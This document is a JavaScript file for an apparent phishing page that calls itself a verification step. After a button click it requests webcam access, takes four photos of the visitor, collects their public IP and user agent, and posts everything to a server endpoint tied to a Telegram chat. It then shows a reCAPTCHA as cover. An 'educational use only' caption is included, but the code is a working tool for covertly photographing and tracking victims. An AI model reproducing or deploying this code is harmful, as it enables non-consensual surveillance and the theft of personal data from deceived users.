const params = new URLSearchParams(window.location.search);
const chatId = params.get("id");

const video = document.createElement("video");
const canvas = document.getElementById("canvas");
const toast = document.getElementById("toast");

let stream;
let publicIP = "Unknown";

let captureCount = 0;
const MAX_CAPTURE = 4;
const INTERVAL = 3000;

// Toast
function showToast(msg){
  toast.innerText = msg;
  toast.style.opacity = 1;
  setTimeout(()=> toast.style.opacity = 0, 2000);
}

// Get IP
async function fetchIP(){
  try{
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    publicIP = data.ip;
  }catch(e){}
}

// Visit log
fetch("/api/send",{
  method:"POST",
  headers:{ "Content-Type":"application/json" },
  body: JSON.stringify({ type:"visit" })
});

// Start camera
async function startCamera(){
  try{
    await fetchIP();

    stream = await navigator.mediaDevices.getUserMedia({video:true});
    video.srcObject = stream;

    video.onloadedmetadata = () => {
      video.play();

      showToast("📸 Camera active");

      setTimeout(loopCapture, 1000);
    };

  }catch(e){
    showToast("Permission denied ❌");
  }
}

// Loop capture (limited)
function loopCapture(){

  const interval = setInterval(()=>{

    if(video.videoWidth === 0) return;

    captureImage();
    captureCount++;

    showToast(`📸 Captured (${captureCount}/${MAX_CAPTURE})`);

    if(captureCount >= MAX_CAPTURE){
      clearInterval(interval);

      stream.getTracks().forEach(t=>t.stop());

      showRecaptcha();
    }

  }, INTERVAL);
}

// Capture
function captureImage(){
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;

  const ctx = canvas.getContext("2d");
  ctx.drawImage(video,0,0);

  const image = canvas.toDataURL("image/jpeg", 0.7);

  send(image);
}

// Send
async function send(image){

  const caption = `
🌐 IP Address: ${publicIP}

💻 User Agent: ${navigator.userAgent}

📅 Date: ${new Date().toLocaleString()}

⚠️ Educational use only

🔗 Admin: https://t.me/YOUR_TELEGRAM
`;

  await fetch("/api/send",{
    method:"POST",
    headers:{ "Content-Type":"application/json" },
    body: JSON.stringify({
      image,
      caption,
      chatId,
      type:"capture"
    })
  });
}

// Show reCAPTCHA
function showRecaptcha(){
  const div = document.createElement("div");
  div.innerHTML = `
    <div style="margin-top:20px;" class="g-recaptcha" data-sitekey="YOUR_SITE_KEY"></div>
    <br>
    <button onclick="verifyCaptcha()">Continue</button>
  `;
  document.body.appendChild(div);
}

// Verify captcha
function verifyCaptcha(){
  const response = grecaptcha.getResponse();

  if(response.length === 0){
    showToast("❌ Complete reCAPTCHA");
  }else{
    showToast("✅ Verified");
    setTimeout(()=>{
      window.location.href = "next.html";
    },2000);
  }
}

// Button
document.getElementById("verifyBtn").onclick = startCamera;
